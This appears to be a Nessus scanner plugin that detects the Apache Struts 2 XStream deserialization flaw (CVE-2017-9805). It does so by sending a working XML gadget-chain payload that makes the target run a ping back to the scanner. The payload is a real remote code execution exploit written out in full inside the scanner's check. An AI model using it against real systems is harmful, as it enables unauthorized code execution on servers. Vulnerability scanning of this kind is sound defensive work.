#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(102977);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2017-9805");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");

  script_name(english:"Apache Struts 2 REST Plugin XStream XML Request Deserialization RCE");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use the Apache Struts 2 web
framework. A remote code execution vulnerability exists in the REST
plugin, which uses XStreamHandler to insecurely deserialize
user-supplied input in XML requests. An unauthenticated, remote
attacker can exploit this, via a specially crafted XML request, to
execute arbitrary code.

Note that this plugin only reports the first vulnerable instance of a
Struts 2 application.");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-052");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.34");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.13");
  script_set_attribute(attribute:"see_also", value:"https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement");
  script_set_attribute(attribute:"see_also", value:"https://lgtm.com/blog/apache_struts_CVE-2017-9805");
  script_set_attribute(attribute:"see_also", value:"https://github.com/jas502n/St2-052");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.34 or 2.5.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-9805");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache Struts REST Plugin XStream RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts 2 REST Plugin XStream RCE');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/09/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/09/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");
include("torture_cgi.inc");
include("url_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match4 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match4))
    {
      urls = make_list(urls, match4[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}

if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;

urls = list_uniq(urls);
scanner_ip = compat::this_host();
target_ip = get_host_ip();
vuln = FALSE;

ua = get_kb_item("global_settings/http_user_agent");
if (empty_or_null(ua))
  ua = 'Nessus';

pat = hexstr(rand_str(length:10));

os = get_kb_item("Host/OS");
if (!empty_or_null(os) && "windows" >< tolower(os))
{
  ping_cmd = 'ping</string><string>-n</string><string>3</string><string>-l</string><string>500</string><string>' + scanner_ip;
  filter = "icmp and icmp[0] = 8 and src host " + target_ip + " and greater 500";
}
else
{
  ping_cmd = "ping</string><string>-c</string><string>3</string><string>-p</string><string>" + pat + "</string><string>" + scanner_ip;
  filter = "icmp and icmp[0] = 8 and src host " + target_ip;
}

foreach url (urls)
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  post_payload = '<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>' +
  ping_cmd +
  '</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>';

  attack_url = url;

  req =
    'POST ' + attack_url + ' HTTP/1.1\n' +
    'Host: ' + target_ip + ':' + port + '\n' +
    'User-Agent: ' + ua + '\n' +
    'Accept-Language: en-US\n' +
    'Content-Type: application/xml\n' +
    'Content-Length: ' + strlen(post_payload) + '\n' +
    'Connection: Keep-Alive\n' +
    '\n' + post_payload;

  s = send_capture(socket:soc,data:req,pcap_filter:filter,timeout:timeout);
  icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  if ("windows" >< tolower(os) && !isnull(icmp))
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nNessus confirmed this issue by examining ICMP traffic. '+
      'Below is the response :' +
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }
  else if (pat >< icmp)
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nNessus confirmed this issue by examining ICMP traffic and looking for'+
      '\nthe pattern sent in our packet (' + pat + '). Below is the response :'+
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }

  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_WARNING,
  generic    : TRUE,
  request    : make_list(vuln_url),
  output     : report
);
